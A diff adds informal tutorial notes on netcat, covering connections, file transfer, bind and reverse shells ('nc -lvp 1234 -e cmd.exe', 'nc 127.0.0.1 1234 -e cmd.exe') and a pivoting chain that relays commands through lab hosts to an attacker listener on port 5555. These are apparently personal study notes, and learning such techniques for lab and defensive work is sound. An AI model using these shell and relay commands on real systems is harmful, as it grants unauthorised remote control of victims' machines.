@@ -12,3 +12,78 @@ nc -vlp 1234
 Netcat connecting:
 <br>
 nc -nv 127.0.0.1
+
+
+------------------------
+
+
+#nc -v google.com 80
+<now connected to google, we will execute the command>
+GET \
+
+-
+terminal 1 - server
+terminal 2 - client
+-
+
+terminal 1:
+nc -vlp 1234
+
+terminal 2:
+nc -nv 127.0.0.1 (n - no dns and connected now we can message each terminal)
+
+-
+
+terminal 1:
+nc -lvp 1234 < test.txt (when connection is successful, content in the file will be displayed to client)
+
+terminal 2:
+nc -nv 127.0.0.1 1234
+
+-
+
+terminal 1:
+nc -lvp 1234 < test.txt
+
+terminal 2:
+nc -nv 127.0.0.1 1234 > sample.txt (it will get the test.txt file and save it as sample.txt)
+
+-
+(bind shell) - if client request to server and client get shell means - it is bind shell
+in attack basis, server will be running on victim, if i request for connection, i will get shell of victim.
+If I try to connect and I get shell means - it is bind shell
+
+terminal 1:
+nc -lvp 1234 -e cmd.exe
+
+terminal 2:
+nc -nv 127.0.0.1 1234 (will get terminal 1 cmdline in terminal 2)
+
+-
+
+(reverse shell) - if any request to the server, server will get shell means - bind shell
+in attack basis, i running a server, when victim beacons to my server, i get shell.
+If victim connects to me and I get shell means - is it reverse shell
+
+terminal 1:
+nc -lvp 1234
+
+terminal 2:
+nc 127.0.0.1 1234 -e cmd.exe
+
+-
+
+pivoting: (geting access to terminal 3 through terminal 2 from terminal 1 and get output in terminal 4 [attacker's machine listening port 5555])
+we dont have direct access to terminal 3, so we pivoting through terminal 2
+
+Terminal 4: (attacker machine with listen on different port - ubuntu on port 5555)
+nc -lvp 5555
+
+Terminal 3: (pivoted from target - parrot)
+nc -lvp 4444 -e /bin/bash
+
+Terminal 2: (target - kali)
+nc -lvp 1234 | nc 192.168.31.1 4444(pivotable machine) | nc 192.168.31.76 5555
+
+Terminal 1: (attacker machine - ubuntu to execute commands)
+nc -nv 192.168.31.31 1234 (target machine) - we will execute commands in terminal 1 that will reflect in terminal 4
